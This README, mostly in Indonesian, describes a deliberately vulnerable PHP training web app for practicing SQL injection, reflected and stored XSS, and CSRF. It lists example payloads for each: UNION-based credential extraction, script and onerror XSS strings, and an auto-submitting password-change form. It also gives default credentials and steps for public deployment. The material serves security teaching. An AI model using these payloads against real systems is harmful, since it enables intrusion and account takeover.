# 🔴 DVWA - Damn Vulnerable Web Application (Training Lab)

Aplikasi web yang sengaja vulnerable untuk pelatihan penetration testing. Dibuat dari nol dengan fokus 4 vulnerability utama:
- SQL Injection (error-based + blind)
- XSS Reflected
- XSS Stored
- CSRF

## ⚡ Quick Start (Local)

### Prerequisites
- Docker & Docker Compose installed
- Port 8000 available

### Run Locally
```bash
# Clone repository
git clone https://github.com/yourusername/dvwalast
cd dvwalast

# Start containers
docker-compose up -d

# Access application
# Indonesian: http://localhost:8000/login_id.php
# English: http://localhost:8000/login.php

# Credentials
Username: admin
Password: admin123
```

**Tunggu 15 detik untuk database initialization.**

### Stop
```bash
docker-compose down
```

---

## 🚀 Deploy to Railway

### Prerequisites
- GitHub account
- Railway account (free tier tersedia)

### Steps

1. **Push ke GitHub**
```bash
git add .
git commit -m "Deploy to Railway"
git push origin main
```

2. **Buka Railway Dashboard**
   - Pergi ke https://railway.app
   - Login dengan GitHub

3. **New Project → Deploy from GitHub**
   - Pilih `dvwalast` repository
   - Railway akan otomatis detect docker-compose.yml

4. **Configure Environment (opsional)**
   - Railway auto-detect dari docker-compose.yml
   - Atau set manual: DB_HOST, DB_USER, DB_PASSWORD, DB_NAME

5. **Deploy**
   - Tunggu hingga status "Live" (3-5 menit)
   - Klik "Open App"

6. **Access**
   ```
   https://dvwalast-prod.up.railway.app/login_id.php
   Username: admin
   Password: admin123
   ```

**[Detailed Railway Guide](./RAILWAY_DEPLOYMENT.md)**

---

## 🧪 Lab Vulnerabilities

### 1. SQL Injection (SQLi)
**Lokasi:** `/sqli_id.php` (Indonesian) atau `/sqli.php` (English)

**Exploitation:**
```
1 OR 1=1                  → Show all records
1 UNION SELECT 1,2,3,4    → Test columns
1 UNION SELECT username, password, 3, created_at FROM users  → Extract credentials
```

**Error-based & Blind SQLi supported**

### 2. XSS - Reflected
**Lokasi:** `/xss_reflected_id.php`

**Exploitation:**
```
<script>alert('XSS')</script>
<img src=x onerror="alert('XSS')">
<svg onload="alert('XSS')">
```

**Payload tercermin di URL - tidak tersimpan di database**

### 3. XSS - Stored
**Lokasi:** `/xss_stored_id.php`

**Exploitation:**
```
<script>alert('XSS')</script>     → Execute untuk semua user
<img src=x onerror="...">          → Steal cookies
<svg onload="...">                 → Redirect dengan data theft
```

**Payload disimpan di database - execute saat halaman dimuat**

**🔄 Reset Database Button tersedia untuk clear payload**

### 4. CSRF - Change Password
**Lokasi:** `/csrf_id.php`

**Exploitation:**
```html
<form action="http://localhost:8000/csrf.php" method="POST">
    <input type="hidden" name="new_password" value="hacked123">
    <input type="hidden" name="confirm_password" value="hacked123">
</form>
<script>document.forms[0].submit();</script>
```

**Tidak ada CSRF token - form dapat dikirim dari sumber mana saja**

---

## 📁 Project Structure

```
dvwalast/
├── app/
│   ├── config.php              # Database config
│   ├── login.php               # English login (vulnerable SQLi)
│   ├── login_id.php            # Indonesian login
│   ├── dashboard.php           # English dashboard
│   ├── dashboard_id.php        # Indonesian dashboard
│   ├── sqli.php                # English SQLi lab
│   ├── sqli_id.php             # Indonesian SQLi lab
│   ├── xss_reflected.php       # English reflected XSS
│   ├── xss_reflected_id.php    # Indonesian reflected XSS
│   ├── xss_stored.php          # English stored XSS
│   ├── xss_stored_id.php       # Indonesian stored XSS
│   ├── csrf.php                # English CSRF lab
│   ├── csrf_id.php             # Indonesian CSRF lab
│   ├── reset_db.php            # Database reset handler
│   ├── logout.php              # Logout handler
│   └── index.php               # Main entry point
├── db/
│   └── init.sql                # Database initialization
├── docker-compose.yml          # Docker Compose config
├── Dockerfile                  # PHP + Apache config
├── .gitignore
├── railway.json               # Railway deployment config
├── RAILWAY_DEPLOYMENT.md      # Detailed Railway guide
└── README.md
```

---

## 🔐 Default Credentials

```
Username: admin
Password: admin123
```

Atau:
```
Username: user
Password: user123
```

---

## 🛠️ Tech Stack

- **Backend:** PHP 8.2
- **Database:** MariaDB 11
- **Web Server:** Apache
- **Container:** Docker & Docker Compose
- **Hosting:** Railway.app (recommended)

---

## ⚠️ Security Warning

**DVWA is INTENTIONALLY VULNERABLE!**

- ✅ Gunakan hanya untuk training & learning
- ✅ Jangan deploy ke production
- ✅ Jangan gunakan untuk exploit real applications
- ✅ Jangan bagikan kredensial dengan unauthorized users

---

## 📚 Learning Resources

1. **OWASP Top 10** - https://owasp.org/www-project-top-ten/
2. **PortSwigger Web Security Academy** - https://portswigger.net/web-security
3. **HackTheBox** - https://www.hackthebox.com
4. **TryHackMe** - https://tryhackme.com

---

## 📝 License

Educational Purpose Only - Use responsibly!

---

## 🤝 Contributing

Found bugs atau ingin improve? Feel free to fork & contribute!

---

**Happy Hacking! 🔥**
